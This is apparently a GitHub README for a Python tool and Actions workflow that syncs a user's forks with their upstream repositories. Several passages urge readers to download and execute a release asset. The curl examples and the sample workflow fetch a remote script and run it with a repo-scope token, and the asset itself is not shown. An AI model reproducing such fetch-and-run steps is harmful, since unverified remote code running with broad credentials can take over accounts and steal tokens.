# GitHub Forks Sync Manager — Sync All Forks with Upstream

[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/Fingurdaus/Github-Forks-Sync-Manager/releases)

![sync-banner](https://raw.githubusercontent.com/github/explore/main/topics/sync/sync.png)

Automate the synchronization of all forked repositories in a GitHub account with their upstream sources. This repo combines a Python script and GitHub Actions workflows to keep forks up to date with minimal work. Use it to reduce merge conflicts, keep branches current, and streamline fork maintenance.

Topics: automation, forks, github, github-actions, open-source, python, repository-management, script, sync, workflow

Badges
- CI: GitHub Actions
- Language: Python
- Topic: repository management

Quick links
- Releases (download and run the release asset): https://github.com/Fingurdaus/Github-Forks-Sync-Manager/releases
- Repository: https://github.com/Fingurdaus/Github-Forks-Sync-Manager

Why this tool
- Manage tens or hundreds of forks with a single pipeline.
- Keep forks aligned to their upstream default branch.
- Trigger sync on schedule or on demand via workflow_dispatch.
- Use GitHub Actions so you do not need extra servers.
- Use a small Python script to handle API calls, remotes, and merges.

Core concepts
- upstream: the original repository your fork comes from.
- fork: your copy of another repo on GitHub.
- sync: update a fork with commits from its upstream.
- CI workflow: GitHub Actions job that runs the sync script.
- token: a GitHub personal access token (PAT) used to access API and push to forks.

Features
- Scan a GitHub account for forked repos.
- Detect the default branch of each upstream.
- Fast-forward or merge upstream commits into fork default branches.
- Create branches for non-fast-forward changes and open pull requests.
- Mark results with commit messages and tags.
- Support dry-run mode for safe testing.

Screenshots and graphics
![workflow](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)

Installation

1) Download the release asset
Download the release asset from the Releases page and execute it. For example, visit:
https://github.com/Fingurdaus/Github-Forks-Sync-Manager/releases

2) What to download
Download the asset that matches your environment. Releases include:
- forks-sync-manager.py — main Python script
- forks-sync-manager.tar.gz — packaged assets and config
- workflow.yml — example GitHub Actions workflow

3) Execute the script
Make the script executable and run it on a machine with Python 3.9+.

Example:
```bash
# download (replace with chosen asset URL from Releases)
curl -L -o forks-sync-manager.py "https://github.com/Fingurdaus/Github-Forks-Sync-Manager/releases/download/v1.0.0/forks-sync-manager.py"
chmod +x forks-sync-manager.py

# run with required args
./forks-sync-manager.py --token $GITHUB_TOKEN --owner your-github-username
```

If you use the packaged tarball:
```bash
curl -L -o forks-sync-manager.tar.gz "https://github.com/Fingurdaus/Github-Forks-Sync-Manager/releases/download/v1.0.0/forks-sync-manager.tar.gz"
tar xzf forks-sync-manager.tar.gz
cd Github-Forks-Sync-Manager
python -m venv venv
source venv/bin/activate
pip install -r requirements.txt
python forks-sync-manager.py --token $GITHUB_TOKEN --owner your-github-username
```

Quick start (GitHub Actions)
1. Create a repository in your account to hold workflows (or use an existing repo).
2. Place this workflow in .github/workflows/forks-sync.yml

Example workflow:
```yaml
name: Sync Forks

on:
  schedule:
    - cron: '0 2 * * *'   # run daily at 02:00 UTC
  workflow_dispatch:

jobs:
  sync:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout helper repo
        uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.11'

      - name: Download sync script
        run: |
          curl -L -o forks-sync-manager.py "https://github.com/Fingurdaus/Github-Forks-Sync-Manager/releases/download/v1.0.0/forks-sync-manager.py"
          chmod +x forks-sync-manager.py

      - name: Run sync
        env:
          GITHUB_TOKEN: ${{ secrets.PERSONAL_GITHUB_TOKEN }}
        run: |
          python forks-sync-manager.py --token $GITHUB_TOKEN --owner your-github-username --push
```

Secrets and permissions
- PERSONAL_GITHUB_TOKEN should have repo scope for private repos and public_repo for public-only operations.
- In organizations, verify workflows have write access to forks in your account.
- Use fine-grained tokens when possible. Grant only the scopes the script needs.

CLI reference
- --token <token>         : GitHub token or env var GITHUB_TOKEN
- --owner <username>      : GitHub account to scan (user or org)
- --push                  : Push changes back to forks (omit to run dry)
- --create-pr             : Create pull requests for non-fast-forward merges
- --branch <name>         : Use this branch name for update branches
- --concurrency <n>       : Number of repos to process in parallel
- --log-level <level>     : INFO, DEBUG, ERROR

Examples
- Dry run for user "alice":
  python forks-sync-manager.py --token $GITHUB_TOKEN --owner alice

- Push updates and open PRs for org "team-acme":
  python forks-sync-manager.py --token $GITHUB_TOKEN --owner team-acme --push --create-pr

- Run from GitHub Actions using PAT:
  see workflow example above

How it works (overview)
1. Query the GitHub API for repositories owned by the account.
2. Filter repos that are forks and that have an upstream.
3. For each fork:
   - Determine the upstream default branch.
   - Fetch upstream branch commits.
   - Attempt a fast-forward merge to the fork default branch.
   - If a fast-forward fails, create an update branch and create a PR.
4. Push changes to the fork or open PRs based on flags.
5. Emit a summary report and exit status.

Architecture and internals
- Python script uses PyGitHub for API calls and GitPython for local operations.
- The script clones or fetches each fork into a temp folder to apply changes without affecting local dev.
- A basic retry and rate-limit handler prevents excessive API failures.
- The workflow runs in a stateless environment. All repo state is in GitHub.

Tips for large accounts
- Use concurrency control (--concurrency) to limit parallel clones.
- Use a dedicated machine or self-hosted runner to cache Git objects.
- Use a fine-grained schedule (cron) to stagger runs across days.
- Keep token scope minimal and rotate tokens per your security policy.

Release and update strategy
- Follow semantic versioning for releases.
- Each release contains a stable script and a workflow sample.
- Download the release asset and execute the script as described above.

Download and execution reminder
Download the release artifact from the Releases page and execute it on your runner or host:
https://github.com/Fingurdaus/Github-Forks-Sync-Manager/releases
Choose the file that matches your environment and run it with Python 3.9+.

Logging and output
- The script prints a compact log per repo with status codes:
  - OK: fast-forward applied
  - PR: pull request created
  - SKIP: no upstream or not a fork
  - ERR: encountered an error
- Exit code 0 means all operations succeeded or were applied as configured.
- Non-zero exit codes indicate partial or complete failure.

Security and best practices
- Keep tokens out of logs.
- Use repository or organization secrets for GitHub Actions.
- Test in a single account or small set of forks before wide roll-out.
- Track issues and results in a separate repo or issue tracker.

Contributing
- Fork the repo and open a pull request.
- Implement or fix a feature and add tests where relevant.
- Keep changes modular and add a changelog entry for new releases.

License
- This project uses the MIT license. See LICENSE file for details.

Roadmap
- Add support for protected branch handling and auto-merge policies.
- Add native GitHub GraphQL usage to reduce API calls.
- Add more fine-grained retry logic and backoff strategies.
- Improve reporting with a summary artifact in Actions.

Credits
- Built with PyGitHub and GitPython.
- Inspired by common fork management workflows and community scripts.

Contact
- Open issues and pull requests in the repository.
- For feature requests, open an issue with a clear use case.

Releases
[![Release Badge](https://img.shields.io/badge/Releases-%20open-blue?logo=github)](https://github.com/Fingurdaus/Github-Forks-Sync-Manager/releases)
Visit the Releases page to download the recommended asset for your environment and execute it to run the sync.